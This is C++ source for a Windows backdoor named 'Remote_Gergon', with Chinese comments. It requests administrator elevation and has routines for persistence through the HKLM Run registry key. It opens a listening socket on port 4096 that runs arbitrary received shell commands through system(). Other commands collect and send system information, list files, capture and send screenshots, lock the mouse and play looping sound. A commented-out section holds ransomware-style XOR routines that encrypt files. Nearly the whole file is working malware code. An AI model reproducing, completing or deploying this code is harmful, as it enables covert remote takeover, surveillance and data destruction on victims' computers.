#define _AFXDLL
#include <fstream>
#include <thread>
#include <TCHAR.h>
#include <afxext.h>
#include <winsock2.h>
#include <mmsystem.h>
#include <tchar.h>
#include <string>
#include <windows.h> 
#include<Stdio.h>
#include <iostream>
#include <shlobj.h>
#include "resource.h"
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "ws2_32.lib")
//#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
using namespace std;
const char* mutex_name = "Remote_Gergon";
void encryption(char ExePath[]);
void traverFile(char* pathName);

string CheckIP() {
	WSADATA wsaData;
	char name[255];
	char* ip;
	PHOSTENT hostinfo;
	string ipStr;

	if (!WSAStartup(MAKEWORD(2, 0), &wsaData)) {
		if (!gethostname(name, sizeof(name))) {
			if ((hostinfo = gethostbyname(name)) != NULL) {
				ip = inet_ntoa(*(struct in_addr*)*hostinfo->h_addr_list);
				ipStr = ip;
			}
		}
		WSACleanup();
	}
	return ipStr;
}

// 启动时自动注册
void autorun() {
	// 获取当前进程路径
	char file_path[MAX_PATH];
	GetModuleFileName(NULL, file_path, MAX_PATH);

	// 写入注册表
	HKEY hKey;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
	RegSetValueEx(hKey, "Remote_Gergon", 0, REG_SZ, (BYTE*)file_path, strlen(file_path));
	RegCloseKey(hKey);
}

// 持久化
void persist() {
	// 获取当前进程路径
	char file_path[MAX_PATH];
	GetModuleFileName(NULL, file_path, MAX_PATH);

	// 复制一份到用户目录
	char user_path[MAX_PATH];
	SHGetSpecialFolderPath(0, user_path, CSIDL_PROFILE, 0);
	strcat_s(user_path, "\\");
	strcat_s(user_path, "Remote_Gergon.exe");
	CopyFile(file_path, user_path, 0);

	// 写入注册表
	HKEY hKey;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
	RegSetValueEx(hKey, "Remote_Gergon", 0, REG_SZ, (BYTE*)user_path, strlen(user_path));
	RegCloseKey(hKey);
}


int clip(bool lockb = false) {
	RECT rect = {};
	rect.bottom = 1;
	rect.right = 1;
	if (lockb) return ClipCursor(&rect);
	else return ClipCursor(NULL);
}

void GainAdminPrivileges(CString strApp) {
	SHELLEXECUTEINFO execinfo;
	memset(&execinfo, 0, sizeof(execinfo));
	execinfo.lpFile = strApp;
	execinfo.cbSize = sizeof(execinfo);
	execinfo.lpVerb = _T("runas");
	execinfo.fMask = SEE_MASK_NO_CONSOLE;
	execinfo.nShow = SW_SHOWDEFAULT;

	ShellExecuteEx(&execinfo);
}

BOOL ExeIsAdmin() {
#define ACCESS_READ 1
#define ACCESS_WRITE 2
	HANDLE hToken;
	DWORD dwStatus;
	DWORD dwAccessMask;
	DWORD dwAccessDesired;
	DWORD dwACLSize;
	DWORD dwStructureSize = sizeof(PRIVILEGE_SET);
	PACL pACL = NULL;
	PSID psidAdmin = NULL;
	BOOL bReturn = FALSE;
	PRIVILEGE_SET ps;
	GENERIC_MAPPING GenericMapping;
	PSECURITY_DESCRIPTOR psdAdmin = NULL;
	SID_IDENTIFIER_AUTHORITY SystemSidAuthority = SECURITY_NT_AUTHORITY;

	if (!ImpersonateSelf(SecurityImpersonation))
		goto LeaveIsAdmin;

	if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &hToken)) {
		if (GetLastError() != ERROR_NO_TOKEN)
			goto LeaveIsAdmin;

		if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
			goto LeaveIsAdmin;


	}

	if (!AllocateAndInitializeSid(&SystemSidAuthority, 2,
		SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0, &psidAdmin))
		goto LeaveIsAdmin;

	psdAdmin = LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
	if (psdAdmin == NULL)
		goto LeaveIsAdmin;

	if (!InitializeSecurityDescriptor(psdAdmin,
		SECURITY_DESCRIPTOR_REVISION))
		goto LeaveIsAdmin;

	dwACLSize = sizeof(ACL) + sizeof(ACCESS_ALLOWED_ACE) +
		GetLengthSid(psidAdmin) - sizeof(DWORD);

	pACL = (PACL)LocalAlloc(LPTR, dwACLSize);
	if (pACL == NULL)
		goto LeaveIsAdmin;

	if (!InitializeAcl(pACL, dwACLSize, ACL_REVISION2))
		goto LeaveIsAdmin;

	dwAccessMask = ACCESS_READ | ACCESS_WRITE;

	if (!AddAccessAllowedAce(pACL, ACL_REVISION2, dwAccessMask, psidAdmin))
		goto LeaveIsAdmin;

	if (!SetSecurityDescriptorDacl(psdAdmin, TRUE, pACL, FALSE))
		goto LeaveIsAdmin;

	if (!SetSecurityDescriptorGroup(psdAdmin, psidAdmin, FALSE))
		goto LeaveIsAdmin;


	if (!IsValidSecurityDescriptor(psdAdmin))
		goto LeaveIsAdmin;

	dwAccessDesired = ACCESS_READ;

	GenericMapping.GenericRead = ACCESS_READ;
	GenericMapping.GenericWrite = ACCESS_WRITE;
	GenericMapping.GenericExecute = 0;
	GenericMapping.GenericAll = ACCESS_READ | ACCESS_WRITE;

	if (!AccessCheck(psdAdmin, hToken, dwAccessDesired,
		&GenericMapping, &ps, &dwStructureSize, &dwStatus, &bReturn))
		goto LeaveIsAdmin;

	if (!RevertToSelf())
		bReturn = FALSE;
LeaveIsAdmin:
	if (pACL) LocalFree(pACL);
	if (psdAdmin) LocalFree(psdAdmin);
	if (psidAdmin) FreeSid(psidAdmin);

	return bReturn;
}
//鼠标移动
void moveMouseTo(int x, int y) {
	INPUT input;
	input.type = INPUT_MOUSE;//表示模拟鼠标输入
	input.mi.dx = x * (65536 / GetSystemMetrics(SM_CXSCREEN));//表示鼠标移动的距离，以屏幕坐标为单位。这里先将传入的坐标值按比例转换为相应的dx和dy值。
	input.mi.dy = y * (65536 / GetSystemMetrics(SM_CYSCREEN)); //表示鼠标移动的距离，以屏幕坐标为单位。这里先将传入的坐标值按比例转换为相应的dx和dy值。
	input.mi.mouseData = 0;//表示鼠标滚轮滚动的距离，这里设为0。
	input.mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE;//表示鼠标的行为标志，这里设置为MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE，表示移动鼠标并绝对坐标。
	input.mi.time = 0;//表示模拟输入的时间戳，这里设为0。
	input.mi.dwExtraInfo = 0;//表示与模拟输入相关的附加信息，这里设为0。
	SendInput(100, &input, sizeof(INPUT));//使用SendInput函数向系统发送模拟的鼠标输入，参数1表示只模拟一次输入，&input表示输入的数据，sizeof(INPUT)表示输入数据的大小。
}

//鼠标死循环
void Mousedie() {

	int x1, y1;
	const char title[] = "提示";
	//char net_x,net_y;
	// 获取屏幕尺寸
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);

	// 鼠标移动到屏幕中心
	x1 = screenWidth / 2;
	y1 = screenHeight / 2;
	//SetCursorPos((int)x, (int)y);
	char message1[1024];
	snprintf(message1, sizeof(message1), "屏幕screenWidth,screenHeight的大小为：%d,%d\n屏幕中心点坐标位置为：%d,%d", screenWidth, screenHeight, x1, y1);
	char message2[sizeof(message1)];
	strcpy(message2, message1);

	MessageBox(NULL, message2, title, MB_OK);
	//中心点死循环
	while (true) {
		//SetCursorPos(x1, y1);
		moveMouseTo(x1, y1);
	}
}

// 屏幕截图
void screenshot() {
	// 获取屏幕大小
	int screen_width = GetSystemMetrics(SM_CXSCREEN);
	int screen_height = GetSystemMetrics(SM_CYSCREEN);

	// 创建屏幕截图DC
	HDC hdcScreen = CreateDC("DISPLAY", NULL, NULL, NULL);
	HDC hdcCapture = CreateCompatibleDC(hdcScreen);
	HBITMAP hbmCapture = CreateCompatibleBitmap(hdcScreen, screen_width, screen_height);
	SelectObject(hdcCapture, hbmCapture);

	// 截取屏幕
	BitBlt(hdcCapture, 0, 0, screen_width, screen_height, hdcScreen, 0, 0, SRCCOPY);

	// 保存截图
	BITMAPINFOHEADER bmi;
	bmi.biSize = sizeof(BITMAPINFOHEADER);
	bmi.biWidth = screen_width;
	bmi.biHeight = -screen_height;
	bmi.biPlanes = 1;
	bmi.biBitCount = 32;
	bmi.biCompression = BI_RGB;
	bmi.biSizeImage = 0;
	bmi.biXPelsPerMeter = 0;
	bmi.biYPelsPerMeter = 0;
	bmi.biClrUsed = 0;
	bmi.biClrImportant = 0;

	// 创建位图文件
	BITMAPFILEHEADER bmf;
	bmf.bfType = 0x4D42;
	bmf.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + screen_width * screen_height * 4;
	bmf.bfReserved1 = 0;
	bmf.bfReserved2 = 0;
	bmf.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

	// 获取位图数据
	char* data = new char[screen_width * screen_height * 4];
	GetDIBits(hdcCapture, hbmCapture, 0, screen_height, data, (BITMAPINFO*)&bmi, DIB_RGB_COLORS);
	//写入位图文件
	std::ofstream out("screenshot.bmp", std::ios::binary);
	out.write((char*)&bmf, sizeof(BITMAPFILEHEADER));
	out.write((char*)&bmi, sizeof(BITMAPINFOHEADER));
	out.write(data, screen_width * screen_height * 4);
	out.close();
	// 写入文件
	/*ofstream file;
	file.open("C:\\screenshot.bmp", ios::binary);
	file.write((char*)&bmf, sizeof(BITMAPFILEHEADER));
	file.write((char*)&bmi, sizeof(BITMAPINFOHEADER));
	file.write((char*)hdcCapture, screen_width * screen_height * 4);
	file.close();*/

	// 释放资源
	DeleteDC(hdcCapture);
	DeleteDC(hdcScreen);
	DeleteObject(hbmCapture);
}


BOOL GetNtVersionNumbers(DWORD& dwMajorVer, DWORD& dwMinorVer, DWORD& dwBuildNumber)
{
	BOOL bRet = FALSE;
	HMODULE hModNtdll = NULL;
	if (hModNtdll = ::LoadLibraryW(L"ntdll.dll"))
	{
		typedef void (WINAPI* pfRTLGETNTVERSIONNUMBERS)(DWORD*, DWORD*, DWORD*);
		pfRTLGETNTVERSIONNUMBERS pfRtlGetNtVersionNumbers;
		pfRtlGetNtVersionNumbers = (pfRTLGETNTVERSIONNUMBERS)::GetProcAddress(hModNtdll, "RtlGetNtVersionNumbers");
		if (pfRtlGetNtVersionNumbers)
		{
			pfRtlGetNtVersionNumbers(&dwMajorVer, &dwMinorVer, &dwBuildNumber);
			dwBuildNumber &= 0x0ffff;
			bRet = TRUE;
		}

		::FreeLibrary(hModNtdll);
		hModNtdll = NULL;
	}

	return bRet;
}

//判断是否为64位操作系统
BOOL IsWow64()
{
	typedef BOOL(WINAPI* LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
	LPFN_ISWOW64PROCESS fnIsWow64Process;
	BOOL bIsWow64 = FALSE;
	fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(GetModuleHandle(_T("kernel32")), "IsWow64Process");
	if (NULL != fnIsWow64Process)
	{
		fnIsWow64Process(GetCurrentProcess(), &bIsWow64);
	}
	return bIsWow64;
}

string systemjudge() {
	string result;
	SYSTEM_INFO sysInfo;
	DWORD dwMajorVer, dwMinorVer, dwBuildNumber;
	if (GetNtVersionNumbers(dwMajorVer, dwMinorVer, dwBuildNumber)) {
		if (dwMajorVer == 10)
			result += "Windows 10 ";
		else if (dwMajorVer == 6 && dwMinorVer == 1)
			result += "Windows 7 ";
		else if (dwMajorVer == 6 && dwMinorVer == 2)
			result += "Windows 8 ";
		else if (dwMajorVer == 5 && dwMinorVer == 1)
			result += "Windows XP ";
		else if (dwMajorVer == 5 && dwMinorVer == 2)
			result += "Windows Server 2003 ";
		else if (dwMajorVer == 4 && dwMinorVer == 0)
			result += "Windows 95 ";
		else if (dwMajorVer == 4 && dwMinorVer == 10)
			result += "Windows 98 ";
		else if (dwMajorVer == 4 && dwMinorVer == 90)
			result += "Windows Server 2003 ";
		else
			result += "Unknown Windows version ";
		result += to_string(dwBuildNumber) + " (Build)\n";
	}

	// 获取CPU信息
	char cpuInfo[256];
	DWORD bufferSize = sizeof(cpuInfo);
	if (GetEnvironmentVariable("PROCESSOR_IDENTIFIER", cpuInfo, bufferSize))
	{
		result += cpuInfo;
	}
	else
	{
		result += "CPU information not available";
	}
	result += "\n";

	// 获取内存信息
	MEMORYSTATUSEX memInfo;
	ZeroMemory(&memInfo, sizeof(memInfo));
	memInfo.dwLength = sizeof(memInfo);
	if (GlobalMemoryStatusEx(&memInfo))
	{
		result += "Total physical memory: " + to_string(memInfo.ullTotalPhys / (1024 * 1024)) + " MB\n";
	}
	else
	{
		result += "Memory information not available";
	}
	// 硬盘信息
	DWORD serialNum;
	GetVolumeInformation(
		"C:\\",         // 根目录
		nullptr,
		0,
		&serialNum,
		nullptr,
		nullptr,
		nullptr,
		0);
	result += "Hard Disk Serial Number: " + to_string(serialNum) + "\n";

	return result;
}


// 用于加密文件的函数
/*/void encryption(char ExePath[]) {
	// 打开要加密的文件和加密后的文件
	fstream BeforeFile, AfterFile;
	BeforeFile.open(ExePath, ios::in | ios::binary);
	AfterFile.open("C:\\Windows\\save.exe", ios::out | ios::binary);

	// 获取要加密的文件大小
	BeforeFile.seekg(0, ios::end);
	streamoff size = BeforeFile.tellg();
	BeforeFile.seekg(0, ios::beg);

	// 设置加密密码
	string key = "123";

	// 对要加密的文件进行逐字节异或操作，同时写入加密后的文件
	int j = 0;
	for (streamoff i = 0; i < size; i++) {
		AfterFile.put(BeforeFile.get() ^ key[j]);
		if (j + 1 == key.size()) j = 0;
		else j++;
	}

	// 关闭文件
	BeforeFile.close();
	AfterFile.close();

	// 删除原文件，重命名加密后的文件
	remove(ExePath);
	CopyFile("C:\\Windows\\save.exe", ExePath, TRUE);
	remove("C:\\Windows\\save.exe");
}

// 用于寻找某文件夹中所有文件的函数
void traverFile(char* pathName) {
	// 定义结构体变量和缓存区
	WIN32_FIND_DATA findData;
	char buff[MAX_PATH];
	char temp[MAX_PATH];

	// 构造搜索字符串
	sprintf(buff, "%s\\\\*.*", pathName);

	// 打开搜索句柄
	HANDLE hFile = FindFirstFile(buff, &findData);
	if (INVALID_HANDLE_VALUE == hFile) return;

	// 循环搜索所有文件和目录
	BOOL isContinue = true;
	while (isContinue) {
		// 组合文件名
		memset(temp, 0, MAX_PATH);
		sprintf(temp, "%s\\\\%s", pathName, findData.cFileName);

		// 如果是目录，则递归搜索
		if (FILE_ATTRIBUTE_DIRECTORY == findData.dwFileAttributes) {
			if (strcmp(".", findData.cFileName) && strcmp("..", findData.cFileName)) {
				traverFile(temp);
			}
		}
		// 如果是文件，则进行加密操作
		else encryption(temp);

		// 继续查找下一个文件
		isContinue = FindNextFile(hFile, &findData);
	}

	// 关闭搜索句柄
	FindClose(hFile);
}*/
void traverAndWrite(char* pathName) { //定义结构体变量和缓存区，以及文件指针 
	WIN32_FIND_DATA findData; 
	char buff[MAX_PATH]; 
	char temp[MAX_PATH]; 
	FILE* fp = NULL;

	//构造搜索字符串
	sprintf(buff, "%s\\\\*.*", pathName);

	//打开搜索句柄
	HANDLE hFile = FindFirstFile(buff, &findData);
	if (INVALID_HANDLE_VALUE == hFile) return;

	//打开文件指针，用于写入目录和文件名
	fp = fopen("D:\\123.txt", "a+");
	if (fp == NULL) {
		printf("打开文件失败\n");
		return;
	}

	//循环搜索所有文件和目录
	BOOL isContinue = true;
	while (isContinue) {
		//组合文件名
		memset(temp, 0, MAX_PATH);
		sprintf(temp, "%s\\\\%s", pathName, findData.cFileName);

		//如果是目录，则递归搜索
		if (FILE_ATTRIBUTE_DIRECTORY == findData.dwFileAttributes) {
			if (strcmp(".", findData.cFileName) && strcmp("..", findData.cFileName)) {
				traverAndWrite(temp);
			}
		}
		//如果是文件，就将文件名写入到指定文件中
		else fprintf(fp, "%s\n", findData.cFileName);

		//继续查找下一个文件
		isContinue = FindNextFile(hFile, &findData);
	}

	//关闭文件指针和搜索句柄
	fclose(fp);
	FindClose(hFile);
}




int main() {
	char ExePath_c[MAX_PATH] = {};
	GetModuleFileName(NULL, ExePath_c, MAX_PATH);
	string ExePath_str = ExePath_c;

	string::size_type pos = 0;
	while ((pos = ExePath_str.find('\\', pos)) != string::npos) {
		ExePath_str.insert(pos, "\\");
		pos = pos + 2;
	}

	char ExePath[MAX_PATH] = {};
	for (int i = 0; i < ExePath_str.size(); i++)
		ExePath[i] = ExePath_str[i];

	CString ExePath_cstr = ExePath;
	if (!ExeIsAdmin()) GainAdminPrivileges(ExePath_cstr);





	while (true) {
		WSADATA wsdata;
		WSAStartup(MAKEWORD(2, 2), &wsdata);

		SOCKET hServSock = socket(PF_INET, SOCK_STREAM, 0);

		SOCKADDR_IN servAddr;
		servAddr.sin_family = AF_INET;
		servAddr.sin_addr.s_addr = htonl(INADDR_ANY);
		servAddr.sin_port = htons(4096);
		bind(hServSock, (SOCKADDR*)&servAddr, sizeof(servAddr));

		listen(hServSock, 5);
		Sleep(10000);
		std::cout << "listening..." << std::endl;
		SOCKADDR_IN clntAddr;
		int clntAddrSz = sizeof(clntAddr);
		SOCKET hSock = accept(hServSock, (SOCKADDR*)&clntAddr, &clntAddrSz);
		send(hSock, CheckIP().c_str(), 1024, 0);
		send(hSock, CheckIP().c_str(), 1024, 0);

		int x;
		bool b = true;
		string str;
		char s[1024] = {};
		while (recv(hSock, s, 1024, 0) != -1) {
			x = atoi(s);
			if (x == 1) {
				recv(hSock, s, 1024, 0);
				system(s);
				memset(s, 0, sizeof(s));
			}
			else if (x == 2)
			{
				char buf[1024];
				DWORD dwMajorVer, dwMinorVer, dwBuildNumber;
				if (GetNtVersionNumbers(dwMajorVer, dwMinorVer, dwBuildNumber))
				{
					//printf("Build Version = %d.\%d.%d\n", dwMajorVer, dwMinorVer, dwBuildNumber);
					string sysInfo = systemjudge();
					ofstream outFile("SystemInfo.txt");
					if (outFile.is_open())
					{
						outFile << sysInfo;
						outFile.close();
						cout << "System information saved to file SystemInfo.txt" << endl;
					}
					else
					{
						cout << "Error opening file" << endl;
					}
				}

				std::ifstream fin("systeminfo.txt", std::ios::binary);
				//while (!fin.eof())
				//{
				fin.read(buf, sizeof(buf));
				int len = static_cast<int>(fin.gcount());
				send(hSock, buf, len, 0);

				memset(buf, 0, sizeof(buf));
				//}
				fin.close();

			}

			else if (x == 3) traverAndWrite((char*)"D:");
			else if (x == 4)
				PlaySound((LPCSTR)IDR_WAVE1, NULL, SND_RESOURCE | SND_ASYNC | SND_LOOP);
			else if (x == 5) {
				Mousedie();
				/*clip(b);
				b = !b;*/
			}
			
			else if (x == 6) {
				screenshot();
				char buffer[4096];
				int fileSize;
				int nRead;

				// 读取截图文件
				ifstream fin("screenshot.bmp", ios::binary | ios::ate);
				fileSize = (int)fin.tellg();
				fin.seekg(0);

				// 先发送文件大小
				nRead = send(hSock, (char*)&fileSize, sizeof(fileSize), 0);
				if (nRead != sizeof(fileSize)) {
					cout << "send() failed: " << WSAGetLastError() << endl;
					closesocket(hSock);

					WSACleanup();
					return -1;
				}

				// 发送文件数据
				int remainSize = fileSize;
				while (remainSize > 0) {
					fin.read(buffer, min(remainSize, sizeof(buffer)));
					nRead = send(hSock, buffer, fin.gcount(), 0);
					if (nRead <= 0) {
						break;
					}
					remainSize -= nRead;
				}
				fin.close();

			}
			else if (x == 7) {
				char title[1024];
				char message[1024];
				recv(hSock, title, 1024, 0);
				recv(hSock, message, 1024, 0);
				MessageBox(NULL, message, title, MB_OK);
				memset(title, 0, sizeof(title));
				memset(message, 0, sizeof(message));
				memset(s, 0, sizeof(s));
			}

			else if (x == 8) break;
			send(hSock, CheckIP().c_str(), 1024, 0);
		}


		closesocket(hSock);
		WSACleanup();
	}
	return 0;
}
